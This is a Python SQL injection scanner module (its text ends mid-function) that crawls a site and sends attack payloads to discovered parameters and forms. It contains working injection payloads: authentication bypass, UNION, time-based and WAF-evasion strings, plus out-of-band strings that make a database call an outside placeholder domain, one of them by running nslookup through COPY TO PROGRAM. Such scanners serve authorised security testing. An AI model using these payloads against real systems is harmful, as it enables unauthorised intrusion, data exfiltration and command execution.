"""Enhanced SQL Injection Scanner Module - Industry-Grade Detection with Performance & Security Improvements."""

import asyncio
import subprocess
import json
import tempfile
import os
import statistics
import time
import hashlib
import logging
import shlex
from typing import Dict, List, Any, Optional, Tuple, Set, Pattern, Union
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urlencode, urljoin, quote, unquote
from collections import defaultdict
from functools import lru_cache
from contextlib import asynccontextmanager
import re
import httpx
from bs4 import BeautifulSoup
from ..base_module import (
    BaseScannerModule,
    ScanConfig,
    ScanResult,
    Vulnerability,
    SeverityLevel,
    ScanType
)

# Configure logging
logger = logging.getLogger(__name__)


class ConnectionPool:
    """HTTP connection pool manager for improved performance."""
    
    def __init__(self, max_connections: int = 10, max_keepalive: int = 5):
        self.max_connections = max_connections
        self.max_keepalive = max_keepalive
        self._pools: Dict[str, httpx.AsyncClient] = {}
    
    @asynccontextmanager
    async def get_client(self, base_url: str) -> httpx.AsyncClient:
        """Get or create a client for the given base URL."""
        parsed = urlparse(base_url)
        pool_key = f"{parsed.scheme}://{parsed.netloc}"
        
        if pool_key not in self._pools:
            limits = httpx.Limits(
                max_connections=self.max_connections,
                max_keepalive_connections=self.max_keepalive
            )
            self._pools[pool_key] = httpx.AsyncClient(
                verify=False,
                timeout=httpx.Timeout(15.0),
                limits=limits,
                follow_redirects=True
            )
        
        try:
            yield self._pools[pool_key]
        except Exception as e:
            logger.error(f"Connection pool error: {e}")
            raise
    
    async def close_all(self):
        """Close all connection pools."""
        for client in self._pools.values():
            await client.aclose()
        self._pools.clear()


class CircuitBreaker:
    """Circuit breaker pattern for handling failing endpoints."""
    
    def __init__(self, failure_threshold: int = 5, recovery_timeout: int = 60):
        self.failure_threshold = failure_threshold
        self.recovery_timeout = recovery_timeout
        self._failures: Dict[str, int] = defaultdict(int)
        self._last_failure_time: Dict[str, float] = {}
        self._circuit_open: Dict[str, bool] = defaultdict(bool)
    
    def is_open(self, endpoint: str) -> bool:
        """Check if circuit is open for the endpoint."""
        if not self._circuit_open[endpoint]:
            return False
        
        # Check if recovery timeout has passed
        if time.time() - self._last_failure_time.get(endpoint, 0) > self.recovery_timeout:
            self._reset(endpoint)
            return False
        
        return True
    
    def record_success(self, endpoint: str):
        """Record a successful request."""
        self._reset(endpoint)
    
    def record_failure(self, endpoint: str):
        """Record a failed request."""
        self._failures[endpoint] += 1
        self._last_failure_time[endpoint] = time.time()
        
        if self._failures[endpoint] >= self.failure_threshold:
            self._circuit_open[endpoint] = True
            logger.warning(f"Circuit breaker opened for {endpoint}")
    
    def _reset(self, endpoint: str):
        """Reset the circuit breaker for an endpoint."""
        self._failures[endpoint] = 0
        self._circuit_open[endpoint] = False
        if endpoint in self._last_failure_time:
            del self._last_failure_time[endpoint]


class ResponseCache:
    """Cache for baseline responses to improve performance."""
    
    def __init__(self, max_size: int = 100, ttl: int = 300):
        self.max_size = max_size
        self.ttl = ttl
        self._cache: Dict[str, Tuple[Any, float]] = {}
    
    def get(self, key: str) -> Optional[Any]:
        """Get cached response if valid."""
        if key in self._cache:
            value, timestamp = self._cache[key]
            if time.time() - timestamp < self.ttl:
                return value
            else:
                del self._cache[key]
        return None
    
    def set(self, key: str, value: Any):
        """Cache a response."""
        # Implement simple LRU by removing oldest if at capacity
        if len(self._cache) >= self.max_size:
            oldest_key = min(self._cache.keys(), 
                           key=lambda k: self._cache[k][1])
            del self._cache[oldest_key]
        
        self._cache[key] = (value, time.time())
    
    def clear(self):
        """Clear the cache."""
        self._cache.clear()


class WebCrawler:
    """Web crawler to discover URLs and forms for SQL injection testing."""
    
    def __init__(self, max_depth: int = 3, max_urls: int = 50):
        self.max_depth = max_depth
        self.max_urls = max_urls
        self.visited_urls: Set[str] = set()
        self.discovered_urls: List[str] = []
        self.forms: List[Dict[str, Any]] = []
        self.urls_with_params: List[str] = []
        
    async def crawl(self, start_url: str, pool: ConnectionPool) -> Dict[str, Any]:
        """Crawl website starting from the given URL."""
        self.visited_urls.clear()
        self.discovered_urls.clear()
        self.forms.clear()
        self.urls_with_params.clear()
        
        await self._crawl_recursive(start_url, 0, pool)
        
        return {
            'discovered_urls': self.discovered_urls,
            'forms': self.forms,
            'urls_with_params': self.urls_with_params,
            'total_urls': len(self.discovered_urls)
        }
    
    async def _crawl_recursive(self, url: str, depth: int, pool: ConnectionPool):
        """Recursively crawl URLs."""
        if depth > self.max_depth or len(self.discovered_urls) >= self.max_urls:
            return
        
        if url in self.visited_urls:
            return
        
        self.visited_urls.add(url)
        self.discovered_urls.append(url)
        
        # Check if URL has parameters
        parsed = urlparse(url)
        if parsed.query:
            self.urls_with_params.append(url)
        
        try:
            async with pool.get_client(url) as client:
                response = await client.get(url, timeout=10)
                
                if response.status_code != 200:
                    return
                
                soup = BeautifulSoup(response.text, 'html.parser')
                
                # Extract forms
                forms = soup.find_all('form')
                for form in forms:
                    form_data = self._extract_form_data(form, url)
                    if form_data:
                        self.forms.append(form_data)
                
                # Extract links
                links = soup.find_all('a', href=True)
                for link in links:
                    href = link['href']
                    absolute_url = urljoin(url, href)
                    
                    # Only crawl same domain
                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
                        if absolute_url not in self.visited_urls:
                            await self._crawl_recursive(absolute_url, depth + 1, pool)
                
                # Extract URLs from JavaScript
                js_urls = re.findall(r'["\']([^"\']*\?[^"\']*=[^"\']*)["\'"]', response.text)
                for js_url in js_urls:
                    absolute_url = urljoin(url, js_url)
                    if urlparse(absolute_url).netloc == urlparse(url).netloc:
                        if absolute_url not in self.visited_urls and '?' in absolute_url:
                            self.urls_with_params.append(absolute_url)
                            self.discovered_urls.append(absolute_url)
                
        except Exception as e:
            logger.debug(f"Error crawling {url}: {e}")
    
    def _extract_form_data(self, form, base_url: str) -> Optional[Dict[str, Any]]:
        """Extract form data for testing."""
        try:
            action = form.get('action', '')
            method = form.get('method', 'GET').upper()
            
            if not action:
                action = base_url
            else:
                action = urljoin(base_url, action)
            
            inputs = []
            for input_tag in form.find_all(['input', 'textarea', 'select']):
                input_name = input_tag.get('name')
                if input_name:
                    input_type = input_tag.get('type', 'text')
                    inputs.append({
                        'name': input_name,
                        'type': input_type,
                        'value': input_tag.get('value', '')
                    })
            
            if inputs:
                return {
                    'action': action,
                    'method': method,
                    'inputs': inputs,
                    'source_url': base_url
                }
        except Exception as e:
            logger.debug(f"Error extracting form data: {e}")
        
        return None


class PayloadGenerator:
    """Dynamic SQL injection payload generator with enhanced capabilities."""
    
    def __init__(self):
        self.database_signatures = {
            'mysql': ['mysql', 'maria', 'percona'],
            'postgresql': ['postgres', 'psql', 'pg_'],
            'mssql': ['microsoft sql', 'mssql', 'sql server'],
            'oracle': ['oracle', 'ora-'],
            'sqlite': ['sqlite'],
            'mongodb': ['mongodb', 'mongo'],
            'cosmosdb': ['cosmos', 'documentdb'],
            'cassandra': ['cassandra', 'cql']
        }
        
    def generate_payloads(self, context: str = 'generic', db_type: Optional[str] = None) -> List[Dict[str, Any]]:
        """Generate context-aware payloads."""
        payloads = []
        
        # Basic error-based payloads
        payloads.extend(self._get_error_based_payloads(db_type))
        
        # Context-specific payloads
        if context == 'where':
            payloads.extend(self._get_where_clause_payloads(db_type))
        elif context == 'order_by':
            payloads.extend(self._get_order_by_payloads(db_type))
        elif context == 'union':
            payloads.extend(self._get_union_payloads(db_type))
        
        # Time-based blind payloads
        payloads.extend(self._get_time_based_payloads(db_type))
        
        # Boolean-based blind payloads
        payloads.extend(self._get_boolean_payloads())
        
        # WAF evasion variants
        payloads.extend(self._get_evasion_payloads(db_type))
        
        return payloads
    
    def _get_error_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get error-based payloads."""
        base_payloads = [
            {"payload": "'", "type": "error-based", "description": "Single quote"},
            {"payload": "\"", "type": "error-based", "description": "Double quote"},
            {"payload": "')", "type": "error-based", "description": "Quote with parenthesis"},
            {"payload": "'))", "type": "error-based", "description": "Quote with double parenthesis"},
        ]
        
        if not db_type or db_type == 'mysql':
            base_payloads.extend([
                {"payload": "' AND EXTRACTVALUE(1,CONCAT(0x7e,DATABASE(),0x7e))--", "type": "error-based", "description": "MySQL EXTRACTVALUE"},
                {"payload": "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.TABLES GROUP BY x)a)--", "type": "error-based", "description": "MySQL double query"},
            ])
        
        if not db_type or db_type == 'postgresql':
            base_payloads.extend([
                {"payload": "' AND 1=CAST((SELECT version()) AS int)--", "type": "error-based", "description": "PostgreSQL type casting"},
            ])
        
        if not db_type or db_type == 'mssql':
            base_payloads.extend([
                {"payload": "' AND 1=CONVERT(int,@@version)--", "type": "error-based", "description": "MSSQL type conversion"},
            ])
        
        return base_payloads
    
    def _get_where_clause_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get WHERE clause specific payloads."""
        return [
            {"payload": "' OR '1'='1", "type": "boolean-where", "description": "Always true condition"},
            {"payload": "' OR '1'='1' --", "type": "boolean-where", "description": "Always true with comment"},
            {"payload": "' OR 1=1 --", "type": "boolean-where", "description": "Numeric always true"},
            {"payload": "admin' --", "type": "auth-bypass", "description": "Admin bypass"},
        ]
    
    def _get_order_by_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get ORDER BY clause specific payloads."""
        payloads = [
            {"payload": "1 ASC", "type": "order-by", "description": "Valid ORDER BY"},
            {"payload": "1 DESC", "type": "order-by", "description": "Valid ORDER BY DESC"},
        ]
        
        if not db_type or db_type == 'mysql':
            payloads.append({"payload": "(SELECT IF(1=1,1,(SELECT 1 UNION SELECT 2)))", "type": "order-by-blind", "description": "MySQL ORDER BY blind"})
        
        return payloads
    
    def _get_union_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get UNION-based payloads."""
        return [
            {"payload": "' UNION SELECT NULL--", "type": "union", "description": "UNION 1 column"},
            {"payload": "' UNION SELECT NULL,NULL--", "type": "union", "description": "UNION 2 columns"},
            {"payload": "' UNION SELECT NULL,NULL,NULL--", "type": "union", "description": "UNION 3 columns"},
            {"payload": "' UNION SELECT 1,2,3--", "type": "union", "description": "UNION numeric values"},
            {"payload": "' UNION ALL SELECT NULL--", "type": "union", "description": "UNION ALL 1 column"},
        ]
    
    def _get_time_based_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get time-based blind payloads."""
        payloads = []
        
        if not db_type or db_type == 'mysql':
            payloads.extend([
                {"payload": "' AND SLEEP(5)--", "type": "time-based", "delay": 5, "description": "MySQL SLEEP"},
                {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "type": "time-based", "delay": 5, "description": "MySQL nested SLEEP"},
                {"payload": "' AND IF(1=1,SLEEP(5),0)--", "type": "time-based", "delay": 5, "description": "MySQL conditional SLEEP"},
            ])
        
        if not db_type or db_type == 'postgresql':
            payloads.extend([
                {"payload": "'; SELECT pg_sleep(5)--", "type": "time-based", "delay": 5, "description": "PostgreSQL pg_sleep"},
                {"payload": "' AND 1=(SELECT 1 FROM pg_sleep(5))--", "type": "time-based", "delay": 5, "description": "PostgreSQL nested sleep"},
            ])
        
        if not db_type or db_type == 'mssql':
            payloads.extend([
                {"payload": "'; WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL WAITFOR"},
                {"payload": "' IF 1=1 WAITFOR DELAY '00:00:05'--", "type": "time-based", "delay": 5, "description": "MSSQL conditional WAITFOR"},
            ])
        
        if not db_type or db_type == 'oracle':
            payloads.extend([
                {"payload": "' AND DBMS_PIPE.RECEIVE_MESSAGE(('a'),5)--", "type": "time-based", "delay": 5, "description": "Oracle DBMS_PIPE"},
            ])
        
        return payloads
    
    def _get_boolean_payloads(self) -> List[Dict[str, Any]]:
        """Get boolean-based blind payloads."""
        return [
            {"payload": "' AND '1'='1", "type": "boolean-true", "description": "True condition"},
            {"payload": "' AND '1'='2", "type": "boolean-false", "description": "False condition"},
            {"payload": "' AND 1=1--", "type": "boolean-true", "description": "Numeric true"},
            {"payload": "' AND 1=2--", "type": "boolean-false", "description": "Numeric false"},
            {"payload": "' AND 'a'='a", "type": "boolean-true", "description": "String true"},
            {"payload": "' AND 'a'='b", "type": "boolean-false", "description": "String false"},
        ]
    
    def _get_evasion_payloads(self, db_type: Optional[str]) -> List[Dict[str, Any]]:
        """Get WAF evasion payloads."""
        return [
            {"payload": "'/**/OR/**/1=1--", "type": "evasion-comment", "description": "Comment-based evasion"},
            {"payload": "'+OR+1=1--", "type": "evasion-plus", "description": "Plus sign evasion"},
            {"payload": "'||'1'='1", "type": "evasion-concat", "description": "Concatenation evasion"},
            {"payload": "%27%20OR%201=1--", "type": "evasion-encoded", "description": "URL encoded"},
            {"payload": "' /*!50000OR*/ 1=1--", "type": "evasion-version", "description": "MySQL version comment"},
            {"payload": "' %0aOR%0a1=1--", "type": "evasion-newline", "description": "Newline evasion"},
            {"payload": "' %09OR%091=1--", "type": "evasion-tab", "description": "Tab evasion"},
        ]
    
    def detect_database_type(self, error_text: str) -> Optional[str]:
        """Detect database type from error messages."""
        error_lower = error_text.lower()
        
        for db_type, signatures in self.database_signatures.items():
            for signature in signatures:
                if signature in error_lower:
                    return db_type
        
        return None


class OOBDetector:
    """Out-of-Band SQL injection detector."""
    
    def __init__(self, domain: str = None):
        self.domain = domain or "oob-sqli-test.example.com"
        self.interactions = {}
    
    def generate_oob_payload(self, param_name: str, db_type: str = 'mysql') -> Tuple[str, str]:
        """Generate OOB payload and unique identifier."""
        unique_id = hashlib.md5(f"{param_name}{time.time()}".encode()).hexdigest()[:8]
        subdomain = f"{unique_id}.{self.domain}"
        
        # Fixed: Properly quote subdomain to prevent injection
        payloads = {
            'mysql': f"' UNION SELECT LOAD_FILE(CONCAT('\\\\\\\\','{subdomain}','\\\\test'))--",
            'mssql': f"'; EXEC master..xp_dirtree '\\\\{subdomain}\\test'--",
            'oracle': f"' UNION SELECT UTL_INADDR.get_host_address('{subdomain}') FROM dual--",
            'postgresql': f"'; COPY (SELECT '') TO PROGRAM 'nslookup {subdomain}'--",
        }
        
        payload = payloads.get(db_type, payloads['mysql'])
        return payload, unique_id
    
    def check_interaction(self, unique_id: str) -> bool:
        """Check if OOB interaction occurred (stub - needs DNS/HTTP server)."""
        # In production, this would check DNS logs or HTTP callbacks
        # For now, return False as we don't have the infrastructure
        return False


class SQLInjectionScanner(BaseScannerModule):
    """Enhanced SQL Injection vulnerability scanner."""
    
    # Configuration constants
    MAX_PAYLOADS_PER_PARAM = 20
    BASELINE_REQUESTS = 5
    TIME_BASED_REQUESTS = 3
    STATISTICAL_Z_THRESHOLD = 2.0
    MIN_TIME_DELAY = 0.8  # 80% of expected delay
    
    # Detection thresholds
    ERROR_CONFIDENCE_THRESHOLD = 0.7
    BOOLEAN_CONFIDENCE_THRESHOLD = 0.6
    LENGTH_DIFF_THRESHOLD = 100
    
    # Compiled regex patterns (class level for efficiency)
    FORM_PATTERN = re.compile(r'<form[^>]*>(.*?)</form>', re.IGNORECASE | re.DOTALL)
    INPUT_PATTERN = re.compile(r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>', re.IGNORECASE)
    
    def __init__(self):
        super().__init__()
        self.name = "SQLInjectionScanner"
        self.description = "Industry-grade SQL injection vulnerability scanner with crawling support"
        self.scan_type = ScanType.ACTIVE
        self.payload_generator = PayloadGenerator()
        self.oob_detector = OOBDetector()
        self.logger = logging.getLogger(__name__)
        self._last_request_time = 0
        
        # Initialize connection pool, circuit breaker, and cache
        self.connection_pool = ConnectionPool(max_connections=10, max_keepalive=5)
        self.circuit_breaker = CircuitBreaker(failure_threshold=5, recovery_timeout=60)
        self.response_cache = ResponseCache(max_size=100, ttl=300)
        
        # Initialize web crawler
        self.crawler = WebCrawler(max_depth=3, max_urls=50)
        
        # SQL error patterns with severity indicators
        self.sql_error_patterns = [
            # MySQL - High confidence
            (r"SQL syntax.*MySQL", 0.95, "MySQL"),
            (r"Warning.*mysql_", 0.95, "MySQL"),
            (r"MySqlException", 0.95, "MySQL"),
            (r"com\.mysql\.jdbc", 0.95, "MySQL"),
            
            # PostgreSQL - High confidence
            (r"PostgreSQL.*ERROR", 0.95, "PostgreSQL"),
            (r"Warning.*\Wpg_", 0.95, "PostgreSQL"),
            (r"Npgsql\.", 0.95, "PostgreSQL"),
            (r"org\.postgresql\.util\.PSQLException", 0.95, "PostgreSQL"),
            
            # MS SQL Server - High confidence
            (r"Driver.*SQL[\-\_\ ]*Server", 0.95, "MSSQL"),
            (r"OLE DB.*SQL Server", 0.95, "MSSQL"),
            (r"SQLServer.*JDBC", 0.95, "MSSQL"),
            (r"System\.Data\.SqlClient\.SqlException", 0.95, "MSSQL"),
            
            # Oracle - High confidence
            (r"ORA-\d{5}", 0.95, "Oracle"),
            (r"Oracle.*Driver", 0.95, "Oracle"),
            (r"oracle\.jdbc", 0.95, "Oracle"),
            
            # SQLite - High confidence
            (r"SQLite/JDBCDriver", 0.95, "SQLite"),
            (r"SQLite\.Exception", 0.95, "SQLite"),
            (r"System\.Data\.SQLite\.SQLiteException", 0.95, "SQLite"),
            
            # Generic SQL errors - Medium confidence
            (r"SQL error", 0.7, "Generic"),
            (r"syntax error", 0.6, "Generic"),
            (r"database error", 0.7, "Generic"),
            (r"Incorrect syntax near", 0.8, "Generic"),
            (r"Unclosed quotation mark", 0.8, "Generic"),
            (r"quoted string not properly terminated", 0.8, "Generic"),
        ]
    
    def __del__(self):
        """Cleanup resources on deletion."""
        if hasattr(self, 'connection_pool'):
            asyncio.create_task(self.connection_pool.close_all())
    
    def validate_target(self, target: str) -> bool:
        """Validate if target is suitable for SQL injection testing."""
        if not target:
            return False
        
        # Ensure proper URL format
        if not target.startswith(('http://', 'https://')):
            target = f"https://{target}"
        
        try:
            parsed = urlparse(target)
            # Check for valid scheme and netloc
            if not (parsed.scheme in ['http', 'https'] and parsed.netloc):
                return False
            
            # Security check: avoid scanning internal/local addresses in production
            # (can be configured via environment variable)
            if os.getenv('BLOCK_INTERNAL_SCAN', 'false').lower() == 'true':
                blacklist = ['localhost', '127.0.0.1', '0.0.0.0', '::1']
                if any(bl in parsed.netloc.lower() for bl in blacklist):
                    self.logger.warning(f"Blocked scan of internal address: {parsed.netloc}")
                    return False
                
            return True
        except Exception as e:
            self.logger.error(f"Target validation failed: {e}")
            return False
    
    async def scan(self, config: ScanConfig) -> ScanResult:
        """Perform comprehensive SQL injection scan."""
        started_at = datetime.utcnow()
        vulnerabilities = []
        errors = []
        warnings = []
        info = {
            'tested_parameters': [],
            'vulnerable_parameters': [],
            'injection_types': [],
            'database_type': None,
            'detection_methods': [],
            'second_order_candidates': [],
            'crawled_urls': [],
            'forms_found': [],
        }
        scan_statistics = {
            'urls_tested': 0,
            'parameters_tested': 0,
            'payloads_sent': 0,
            'vulnerabilities_found': 0,
            'injection_points': 0,
            'false_positives_filtered': 0,
            'payloads_by_type': {
                'error-based': 0,
                'time-based': 0,
                'boolean-based': 0,
                'union-based': 0,
                'other': 0
            }
        }
        
        try:
            target_url = config.target
            if not target_url.startswith(('http://', 'https://')):
                target_url = f"https://{target_url}"
            
            # Phase 0: Web crawling to discover URLs and forms
            if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
                self.logger.info(f"Starting web crawling for {target_url}")
                crawl_results = await self.crawler.crawl(target_url, self.connection_pool)
                info['crawled_urls'] = crawl_results['discovered_urls']
                info['forms_found'] = crawl_results['forms']
                scan_statistics['urls_tested'] = len(crawl_results['discovered_urls'])
                
                # Prioritize URLs with parameters for testing
                urls_to_test = crawl_results['urls_with_params'][:10] if crawl_results['urls_with_params'] else [target_url]
            else:
                urls_to_test = [target_url]
                scan_statistics['urls_tested'] = 1
            
            if config.scan_type == ScanType.PASSIVE:
                # Passive scan on all discovered URLs
                for test_url in urls_to_test:
                    passive_vulns = await self._passive_sql_check(test_url)
                    vulnerabilities.extend(passive_vulns)
            else:
                # Test each discovered URL
                for test_url in urls_to_test:
                    self.logger.info(f"Testing URL: {test_url}")
                    
                    # Phase 1: Initial reconnaissance
                    recon_data = await self._reconnaissance_phase(test_url, config)
                    if not info['database_type']:
                        info['database_type'] = recon_data.get('database_type')
                
                    # Phase 2: Enhanced manual testing with dynamic payloads
                    manual_results = await self._enhanced_manual_testing(
                        test_url, config, recon_data.get('database_type')
                    )
                    vulnerabilities.extend(manual_results['vulnerabilities'])
                    info['tested_parameters'].extend(manual_results['tested_params'])
                    scan_statistics['parameters_tested'] += len(manual_results['tested_params'])
                    scan_statistics['payloads_sent'] += manual_results.get('payloads_sent', 0)
                    
                    # Update payload type statistics
                    for ptype, count in manual_results.get('payloads_by_type', {}).items():
                        if ptype in scan_statistics['payloads_by_type']:
                            scan_statistics['payloads_by_type'][ptype] += count
                    scan_statistics['false_positives_filtered'] += manual_results.get('false_positives', 0)
                
                    # Phase 3: Advanced time-based detection with statistical analysis
                    if config.scan_type in [ScanType.ACTIVE, ScanType.AGGRESSIVE]:
                        time_based_results = await self._advanced_time_based_detection(
                            test_url, config, recon_data.get('database_type')
                        )
                        vulnerabilities.extend(time_based_results['vulnerabilities'])
                        if 'Statistical Time-Based Analysis' not in info['detection_methods']:
                            info['detection_methods'].append('Statistical Time-Based Analysis')
                
                    # Phase 4: Second-order SQL injection detection
                    if config.scan_type == ScanType.AGGRESSIVE:
                        second_order_results = await self._second_order_detection(test_url, config)
                        vulnerabilities.extend(second_order_results['vulnerabilities'])
                        info['second_order_candidates'].extend(second_order_results.get('candidates', []))
                        if second_order_results['vulnerabilities'] and 'Second-Order SQLi' not in info['detection_methods']:
                            info['detection_methods'].append('Second-Order SQLi')
                
                    # Phase 5: Form testing with context awareness
                    form_results = await self._context_aware_form_testing(
                        test_url, config, recon_data.get('database_type')
                    )
                    vulnerabilities.extend(form_results)
                
                    # Phase 6: SQLMap integration (if available and aggressive)
                    if config.scan_type == ScanType.AGGRESSIVE and self._is_sqlmap_available():
                        sqlmap_results = await self._intelligent_sqlmap_integration(
                            test_url, config, recon_data
                        )
                        if sqlmap_results:
                            vulnerabilities.extend(sqlmap_results['vulnerabilities'])
                            info['vulnerable_parameters'].extend(sqlmap_results.get('vulnerable_params', []))
                            if not info['database_type']:
                                info['database_type'] = sqlmap_results.get('database_type')
            
            # Deduplicate vulnerabilities
            vulnerabilities = self._deduplicate_vulnerabilities(vulnerabilities)
            scan_statistics['vulnerabilities_found'] = len(vulnerabilities)
            scan_statistics['injection_points'] = len(set(v.evidence.get('parameter', '') for v in vulnerabilities))
            
            # Determine injection types
            injection_types = set()
            for vuln in vulnerabilities:
                vuln_type = vuln.evidence.get('injection_type', vuln.name.split()[0])
                injection_types.add(vuln_type)
            info['injection_types'] = list(injection_types)
            
        except Exception as e:
            error_msg = f"SQL injection scan failed: {str(e)}"
            self.logger.error(error_msg)
            errors.append(error_msg)
        
        completed_at = datetime.utcnow()
        
        return ScanResult(
            module_name=self.name,
            success=len(errors) == 0,
            started_at=started_at,
            completed_at=completed_at,
            vulnerabilities=vulnerabilities,
            errors=errors,
            warnings=warnings,
            info=info,
            statistics=scan_statistics
        )
    
    async def _reconnaissance_phase(self, url: str, config: ScanConfig) -> Dict[str, Any]:
        """Perform initial reconnaissance to identify database type and structure."""
        recon_data = {
            'database_type': None,
            'urls_found': 1,
            'parameters': [],
            'forms': []
        }
        
        try:
            async with httpx.AsyncClient(verify=False, timeout=10) as client:
                response = await client.get(url)
                
                # Detect database type from error messages
                for pattern, confidence, db_type in self.sql_error_patterns:
                    if re.search(pattern, response.text, re.IGNORECASE):
                        recon_data['database_type'] = db_type
                        break
                
                # Look for database fingerprints in headers and content
                if not recon_data['database_type']:
                    recon_data['database_type'] = self._fingerprint_database(response)
                
                # Extract parameters
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                recon_data['parameters'] = list(params.keys())
                
        except Exception as e:
            self.logger.debug(f"Reconnaissance phase error: {e}")
        
        return recon_data
    
    def _fingerprint_database(self, response: httpx.Response) -> Optional[str]:
        """Fingerprint database from response characteristics."""
        headers = str(response.headers).lower()
        content = response.text.lower()
        
        # Check headers
        if 'x-powered-by' in headers:
            powered_by = response.headers.get('X-Powered-By', '').lower()
            if 'php' in powered_by:
                return 'mysql'  # Common combo
            elif 'asp.net' in powered_by:
                return 'mssql'  # Common combo
        
        # Check for database-specific keywords in content
        if 'phpmyadmin' in content or 'mysql' in content:
            return 'mysql'
        elif 'pgadmin' in content or 'postgresql' in content:
            return 'postgresql'
        elif 'oracle' in content:
            return 'oracle'
        
        return None
    
    async def _enhanced_manual_testing(self, url: str, config: ScanConfig, db_type: Optional[str]) -> Dict[str, Any]:
        """Enhanced manual testing with dynamic payloads."""
        vulnerabilities = []
        tested_params = []
        payloads_sent = 0
        false_positives = 0
        found_error_based = False  # Track if we found error-based SQLi
        
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            common_params = ['id', 'user', 'search', 'q', 'page', 'cat']
            params = {param: ['1'] for param in common_params[:2]}
        
        async with httpx.AsyncClient(verify=False, timeout=15) as client:
            # Get baseline response
            try:
                baseline_response = await self._rate_limited_request(client, url, config)
                baseline_data = self._extract_response_features(baseline_response)
            except (httpx.HTTPError, asyncio.TimeoutError) as e:
                self.logger.debug(f"Baseline request failed: {e}")
                return {'vulnerabilities': [], 'tested_params': [], 'payloads_sent': 0}
            
            for param_name, param_values in params.items():
                tested_params.append(param_name)
                original_value = param_values[0] if param_values else '1'
                
                # Detect injection context
                context = self._detect_injection_context(url, param_name)
                
                # Generate context-aware payloads
                payloads = self.payload_generator.generate_payloads(context, db_type)
                
                # Test all injection types, not just until first found
                for payload_info in payloads[:20]:  # Test more payloads for thoroughness
                    payload = payload_info['payload']
                    payload_type = payload_info['type']
                    
                    test_params = params.copy()
                    test_params[param_name] = [original_value + payload]
                    test_query = urlencode(test_params, doseq=True)
                    test_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{test_query}"
                    
                    try:
                        response = await self._rate_limited_request(client, test_url, config, timeout=15)
                        payloads_sent += 1
                        
                        # Track payload types
                        if 'error' in payload_type:
                            payload_type_key = 'error-based'
                        elif 'time' in payload_type:
                            payload_type_key = 'time-based'
                        elif 'boolean' in payload_type:
                            payload_type_key = 'boolean-based'
                        elif 'union' in payload_type:
                            payload_type_key = 'union-based'
                        else:
                            payload_type_key = 'other'
                        
                        # Enhanced error-based detection
                        if 'error' in payload_type:
                            error_result = self._enhanced_error_detection(
                                response, baseline_response, payload_info
                            )
                            if error_result['vulnerable']:
                                # Verify to reduce false positives
                                if await self._verify_sql_injection(client, test_url, param_name, params):
                                    vuln = self._create_vulnerability(
                                        param_name, url, payload_info, error_result, 'Error-Based'
                                    )
                                    vulnerabilities.append(vuln)
                                    found_error_based = True
                                    continue  # Continue to test other types
                                else:
                                    false_positives += 1
                        
                        # Boolean-based detection
                        if payload_type in ['boolean-true', 'boolean-false'] and not found_error_based:
                            boolean_result = await self._enhanced_boolean_detection(
                                client, url, param_name, params, original_value, baseline_data, config
                            )
                            if boolean_result['vulnerable']:
                                vuln = self._create_vulnerability(
                                    param_name, url, payload_info, boolean_result, 'Boolean-Based Blind'
                                )
                                vulnerabilities.append(vuln)
                                continue  # Continue testing other types
                    
                    except asyncio.TimeoutError:
                        if 'time-based' in payload_type:
                            # Will be handled by advanced time-based detection
                            self.logger.debug(f"Timeout on time-based payload for {param_name}")
                    except (httpx.HTTPError, Exception) as e:
                        self.logger.debug(f"Request failed for {param_name}: {e}")
        
        return {
            'vulnerabilities': vulnerabilities,
            'tested_params': tested_params,
            'payloads_sent': payloads_sent,
            'false_positives': false_positives,
            'payloads_by_type': {
                'error-based': sum(1 for p in payloads[:payloads_sent] if 'error' in p.get('type', '')),
                'time-based': sum(1 for p in payloads[:payloads_sent] if 'time' in p.get('type', '')),
                'boolean-based': sum(1 for p in payloads[:payloads_sent] if 'boolean' in p.get('type', '')),
                'union-based': sum(1 for p in payloads[:payloads_sent] if 'union' in p.get('type', '')),
            }
        }
    
    def _detect_injection_context(self, url: str, param_name: str) -> str:
        """Detect the SQL context of the injection point."""
        # Heuristics to detect context
        param_lower = param_name.lower()
        
        if 'sort' in param_lower or 'order' in param_lower:
            return 'order_by'
        elif 'search' in param_lower or 'query' in param_lower:
            return 'where'
        else:
            return 'generic'
    
    def _extract_response_features(self, response: httpx.Response) -> Dict[str, Any]:
        """Extract features from response for comparison."""
        return {
            'status_code': response.status_code,
            'length': len(response.text),
            'headers': dict(response.headers),
            'num_tags': len(re.findall(r'<[^>]+>', response.text)),
            'num_words': len(response.text.split()),
            'num_lines': len(response.text.splitlines()),
            'has_table': '<table' in response.text.lower(),
            'has_form': '<form' in response.text.lower(),
            'title': self._extract_title(response.text),
            'hash': hashlib.md5(response.text.encode()).hexdigest(),
        }
    
    def _extract_title(self, html: str) -> str:
        """Extract title from HTML."""
        match = re.search(r'<title[^>]*>(.*?)</title>', html, re.IGNORECASE | re.DOTALL)
        return match.group(1).strip() if match else ""
    
    def _enhanced_error_detection(self, response: httpx.Response, baseline: httpx.Response, 
                                   payload_info: Dict) -> Dict[str, Any]:
        """Enhanced error detection with confidence scoring."""
        result = {
            'vulnerable': False,
            'confidence': 0.0,
            'database_type': None,
            'error_message': None,
            'evidence': {}
        }
        
        # Check if baseline has errors
        baseline_has_errors = any(
            re.search(pattern, baseline.text, re.IGNORECASE)
            for pattern, _, _ in self.sql_error_patterns[:5]
        )
        
        for pattern, base_confidence, db_type in self.sql_error_patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                # Adjust confidence based on baseline
                if baseline_has_errors:
                    confidence = base_confidence * 0.4  # Reduce confidence
                else:
